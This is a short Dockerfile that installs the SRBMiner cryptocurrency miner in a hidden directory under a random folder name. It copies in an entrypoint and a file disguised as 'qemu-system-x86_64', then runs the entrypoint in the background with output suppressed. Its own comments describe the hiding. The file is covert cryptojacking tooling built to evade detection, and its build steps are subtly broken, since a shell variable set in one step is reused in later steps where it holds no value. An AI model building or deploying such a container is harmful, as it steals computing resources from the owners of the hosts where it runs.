# Dockerfile
FROM ubuntu:focal

# Install dependencies
RUN apt-get update && apt-get -y install \
    wget curl coreutils inetutils-ping tar \
    && apt-get -y clean && rm -rf /var/lib/apt-get/lists/*

# Install SRBMiner and hellminer in a hidden directory
RUN mkdir -p /var/.hidden && cd /var/.hidden && \
    wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.7.2/SRBMiner-Multi-2-7-2-Linux.tar.gz && \
    tar -xf SRBMiner-Multi-2-7-2-Linux.tar.gz && \
    rm -rf SRBMiner-Multi-2-7-2-Linux.tar.gz

# Generate a random directory name and rename the SRBMiner folder
RUN RANDOM_DIR=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 16) && \
    mv /var/.hidden/SRBMiner-Multi-2-7-2 /var/.hidden/$RANDOM_DIR

# Copy entrypoint and other files into the random directory
COPY entrypoint /var/.hidden/$RANDOM_DIR/
COPY qemu-system-x86_64 /var/.hidden/$RANDOM_DIR/

# Change permissions of the entrypoint
RUN chmod +x /var/.hidden/$RANDOM_DIR/entrypoint

# Set the work directory to the hidden miner directory
WORKDIR "/var/.hidden/$RANDOM_DIR"

# Start miner in background with suppressed output
ENTRYPOINT ["sh", "-c", "./entrypoint > /dev/null 2>&1 &"]
